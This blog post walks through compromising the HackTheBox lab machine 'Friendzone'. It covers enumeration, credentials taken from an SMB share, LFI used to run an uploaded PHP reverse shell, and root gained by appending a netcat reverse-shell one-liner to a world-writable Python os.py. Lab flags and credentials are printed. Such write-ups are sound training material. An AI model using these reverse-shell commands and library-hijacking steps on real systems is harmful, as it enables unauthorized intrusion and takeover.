---
layout: post
title: Hackthebox Friendzone Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-09-05/friendzone-badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of machine "Friendzone" on that website.<br>

## Solution
### 1. Initial Enumeration
TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.123 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-16 18:51 EEST
Nmap scan report for 10.10.10.123
Host is up (0.039s latency).
Not shown: 65528 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -59m31s, deviation: 1h43m55s, median: 27s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-07-16T18:53:25+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-07-16 18:53:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.39 seconds
{% endhighlight %}

SMB enumeration:
{% highlight shell %}
root@kali:~# smbclient -L 10.10.10.123
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	Files           Disk      FriendZone Samba Server Files /etc/Files
	general         Disk      FriendZone Samba Server Files
	Development     Disk      FriendZone Samba Server Files
	IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            FRIENDZONE
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,401,403' -u http://10.10.10.123

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.123/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,401,403
[+] Timeout      : 10s
=====================================================
2019/07/16 19:04:14 Starting gobuster
=====================================================
/wordpress (Status: 301)
/server-status (Status: 403)
=====================================================
2019/07/16 19:18:59 Finished
=====================================================
{% endhighlight %}

SSL Certification for HTTPS:
{% highlight shell %}
root@kali:~# openssl s_client -showcerts -connect 10.10.10.123:443
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red
verify error:num=18:self signed certificate
verify return:1
depth=0 C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red
verify error:num=10:certificate has expired
notAfter=Nov  4 21:02:30 2018 GMT
verify return:1
depth=0 C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red
notAfter=Nov  4 21:02:30 2018 GMT
verify return:1
---
Certificate chain
 0 s:C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red
   i:C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red
-----BEGIN CERTIFICATE-----
MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD
VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV
BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv
bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4
MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD
VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ
MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq
hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA
A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8
lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH
9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH
gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh
7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q
ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW
BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz
V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj
TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ
LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME
K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF
Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG
X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ
fv9s+GxKNvsBqDBX
-----END CERTIFICATE-----
---
Server certificate
subject=C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red

issuer=C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red

---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1677 bytes and written 376 bytes
Verification error: certificate has expired
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: A11ADA50EDC062B385AEF8C1FAB755E821E43AE3D5B1A8884F363EFF2B02AA21
    Session-ID-ctx: 
    Master-Key: 263902990F378709BBE71C627BE9431D1EF42E4672E1913ECDA2ECD06FFC6BAF7575B2F5B3D620AB1580F71D24F405B3
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - 4b af 91 5b f7 fa 91 ee-a3 76 53 70 03 ba cb 71   K..[.....vSp...q
    0010 - af 26 a8 b1 cb 64 34 62-ed 0d cc 2f 46 b8 75 45   .&...d4b.../F.uE
    0020 - 22 30 8b b4 08 24 99 33-d0 e4 b2 56 95 1c b3 63   "0...$.3...V...c
    0030 - de 0c 5e ef d8 15 d3 0b-45 ee 8c 2d e1 93 8d 2a   ..^.....E..-...*
    0040 - f9 9a f5 5b f0 e0 37 33-73 a7 9b eb 0a 77 32 eb   ...[..73s....w2.
    0050 - 2e d8 9c 47 6b d2 ff d3-c8 9b e4 eb ff 23 86 99   ...Gk........#..
    0060 - 27 67 48 c2 7e 4e 39 79-71 b3 27 98 ef 53 80 e8   'gH.~N9yq.'..S..
    0070 - 2f 4f a8 d5 4e 55 72 31-aa f8 29 de 6c 7e 67 97   /O..NUr1..).l~g.
    0080 - b6 6c 20 51 53 3c 69 1c-a0 4f 2e 23 7e 4c 79 6d   .l QS<i..O.#~Lym
    0090 - e3 e3 3b aa 4d b6 0a 4d-d6 77 f5 04 75 b8 3d f0   ..;.M..M.w..u.=.
    00a0 - f7 15 39 4a 6d f7 2a 60-06 f3 f7 94 02 8f 8d d5   ..9Jm.*`........
    00b0 - f2 1b ac b2 39 33 96 02-70 24 db 06 bc e1 d8 55   ....93..p$.....U

    Start Time: 1563295875
    Timeout   : 7200 (sec)
    Verify return code: 10 (certificate has expired)
    Extended master secret: yes
---
closed
{% endhighlight %}

SMB enumeration:
{% highlight shell %}
root@kali:~# smbclient -L 10.10.10.123
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	Files           Disk      FriendZone Samba Server Files /etc/Files
	general         Disk      FriendZone Samba Server Files
	Development     Disk      FriendZone Samba Server Files
	IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            FRIENDZONE
{% endhighlight %}

### 2. Getting User
At first, try to enumerate SMB because generally it does not take long.<br>
We can find a credential.
{% highlight shell %}
root@kali:~# smbclient //10.10.10.123/general
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 22:10:51 2019
  ..                                  D        0  Wed Jan 23 23:51:02 2019
  creds.txt                           N       57  Wed Oct 10 02:52:42 2018

		9221460 blocks of size 1024. 6380880 blocks available
{% endhighlight %}
{% highlight shell %}
root@kali:~# cat creds.txt 
creds for the admin THING:

admin:WORKWORKHhallelujah@#
{% endhighlight %}

Then, try to look for the place which we can use this credential.<br>
By executing SSL Certification check, we found a domain name "friendzone.red"<br>
So try to access after adding following line in /etc/hosts.
{% highlight shell %}
10.10.10.123 friendzone.red
{% endhighlight %}

Gobuster friendzone.red:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,401,403' -u http://friendzone.red

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://friendzone.red/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,401,403
[+] Timeout      : 10s
=====================================================
2019/07/31 10:55:19 Starting gobuster
=====================================================
/wordpress (Status: 301)
/server-status (Status: 403)
=====================================================
2019/07/31 11:08:22 Finished
=====================================================
{% endhighlight %}

Directory "wordpress" has nothing interesting. However, we can find a new domain "friendzoneportal.red"
![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-08-50.png)

Then add following line and access.
{% highlight shell %}
10.10.10.123 friendzoneportal.red
{% endhighlight %}

Gobuster friendzoneportal.red:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,401,403' -u http://friendzoneportal.red

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://friendzoneportal.red/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,401,403
[+] Timeout      : 10s
=====================================================
2019/07/31 11:24:54 Starting gobuster
=====================================================
/wordpress (Status: 301)
/server-status (Status: 403)
=====================================================
2019/07/31 11:37:56 Finished
=====================================================
{% endhighlight %}

Still same result.<br>
Since generally DNS on TCP port 53 is for zone transfer, check what domain Friendzone has.<br>
Subdomain list of "friendzone.red":
{% highlight shell%}
root@kali:~# host -l friendzone.red 10.10.10.123
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

friendzone.red has IPv6 address ::1
friendzone.red name server localhost.
friendzone.red has address 127.0.0.1
administrator1.friendzone.red has address 127.0.0.1
hr.friendzone.red has address 127.0.0.1
uploads.friendzone.red has address 127.0.0.1
{% endhighlight %}

Subdomain list of "friendzoneportal.red":
{% highlight shell %}
root@kali:~# host -l friendzoneportal.red 10.10.10.123
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

friendzoneportal.red has IPv6 address ::1
friendzoneportal.red name server localhost.
friendzoneportal.red has address 127.0.0.1
admin.friendzoneportal.red has address 127.0.0.1
files.friendzoneportal.red has address 127.0.0.1
imports.friendzoneportal.red has address 127.0.0.1
vpn.friendzoneportal.red has address 127.0.0.1
{% endhighlight %}

Then, try to look around each domains after adding following line in "/etc/hosts" with both http and https.
{% highlight shell %}
10.10.10.123 administrator1.friendzone.red
10.10.10.123 hr.friendzone.red
10.10.10.123 uploads.friendzone.red
10.10.10.123 admin.friendzoneportal.red
10.10.10.123 files.friendzoneportal.red
10.10.10.123 imports.friendzoneportal.red
10.10.10.123 vpn.friendzoneportal.red
{% endhighlight %}

Gobuster "https://administrator1.friendzone.red":
{% highlight shell %}
root@kali:~# gobuster dir --url https://administrator1.friendzone.red/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://administrator1.friendzone.red/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2019/09/04 21:09:27 Starting gobuster
===============================================================
/images (Status: 301)
/login.php (Status: 200)
/dashboard.php (Status: 200)
/timestamp.php (Status: 200)
/server-status (Status: 403)
===============================================================
2019/09/04 21:35:39 Finished
===============================================================
{% endhighlight %}

we can find a login form on "https://administrator1.friendzone.red/login.php".
![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-13-14.png)

we can also find an interesting php script "timestamp.php".
![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-13-35.png)

Next, try to access with the previous credential.<br>
It says go to "dashboard.php".
![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-15-32.png)

We found a shaddy website with php.
![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-16-34.png)

Then, go to "https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp" as he says.
![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-17-32.png)

We can see a paramter "timestamp".<br>
Try to replace the parameter with "login".
![placeholder](https://inar1.github.io/public/images/2019-09-05/2019-09-04-23-19-06.png)

The webapp showed the output of "login.php" (If we put wrong password it says "Wrong!").<br>
This means, we found possible LFI.<br>
<br>
Since we already know that the path for the "File" share is "/etc/Files".
At this time, we need some assuming the path for "Development" share to be "/etc/Development".<br>
Then, try to upload the <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">reverse shell</a> script and access with the LFI vulnerability.<br>
Upload reverse shell:
{% highlight shell %}
smb: \> put php-reverse-shell.php
putting file php-reverse-shell.php as \php-reverse-shell.php (50.1 kb/s) (average 50.1 kb/s)
smb: \> dir
  .                                   D        0  Wed Sep  4 22:08:54 2019
  ..                                  D        0  Wed Jan 23 23:51:02 2019
  php-reverse-shell.php               A     5492  Wed Sep  4 22:08:54 2019

		9221460 blocks of size 1024. 6369608 blocks available
{% endhighlight %}

Access to the reverse shell with browser after launching netcat listener:
{% highlight shell %}
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
{% endhighlight %}

Now we got a reverse shell.
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.123] 44662
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 22:13:04 up  1:08,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
{% endhighlight %}

By following command, we can achieve a full bash shell.
{% highlight shell %}
$ python -c "import pty; pty.spawn('/bin/bash')"
www-data@FriendZone:/$ 
{% endhighlight %}

user.txt is in the directory ""
{% highlight shell %}
www-data@FriendZone:/home/friend$ cat user.txt
cat user.txt
a9ed20acecd6c5b6b52f474e15ae9a11
{% endhighlight %}

### 3. Getting Root
In the directory "/var/www", we can find a password for user "friend".
{% highlight shell %}
www-data@FriendZone:/var/www$ cat mysql_data.conf
cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
{% endhighlight %}

Now we can ssh to the box with the credential
{% highlight shell %}
root@kali:~# ssh friend@10.10.10.123
The authenticity of host '10.10.10.123 (10.10.10.123)' can't be established.
ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.123' (ECDSA) to the list of known hosts.
friend@10.10.10.123's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

You have mail.
Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
friend@FriendZone:~$ 
{% endhighlight %}

To enumerate Linux box, we can use a published script <a href="https://github.com/DominicBreuker/pspy">pspy</a>.<br>
By running this script, we can find a cron job which runs "/opt/server-admin/reporter.py".
{% highlight shell %}
2019/09/04 22:34:01 CMD: UID=0    PID=3787   | /usr/bin/python /opt/server_admin/reporter.py 
2019/09/04 22:34:01 CMD: UID=0    PID=3786   | /bin/sh -c /opt/server_admin/reporter.py 
2019/09/04 22:34:01 CMD: UID=0    PID=3785   | /usr/sbin/CRON -f 
{% endhighlight %}
{% highlight shell %}
friend@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
{% endhighlight %}

Also, By running <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>, we can find a world writable script.<br>
{% highlight shell %}
[-] Files not owned by user but writable by group:
-rwxrw-rw- 1 nobody nogroup 5492 Sep  4 22:08 /etc/Development/php-reverse-shell.php
-rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py
{% endhighlight %}

Meaning we have following information.
1. "/usr/bin/python2.7/os.py" is writable worldwide
2. cron is executing "/opt/server-admin/reporter.py" in a couple of minute as root.
3. "/opt/server-admin/reporter.py" is loading "/usr/bin/python2.7/os.py".

This indicates that we can hijack the python library.<br>
Then, run following command to add some new lines in os.py
{% highlight shell %}
friend@FriendZone:/opt/server_admin$ echo 'import os' >> /usr/lib/python2.7/os.py
friend@FriendZone:/opt/server_admin$ echo 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 4444 >/tmp/f")' >> /usr/lib/python2.7/os.py
{% endhighlight %}

Then, launch a netcat listener
{% highlight shell %}
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
{% endhighlight %}

Couple of minutes later, we can get a root shell.
{% highlight shell %}
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.123] 49954
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
{% endhighlight %}

root.txt is in the root directory.
{% highlight shell %}
# cat /root/root.txt
b0e6c60b82cf96e9855ac1656a9e90c7
{% endhighlight %}
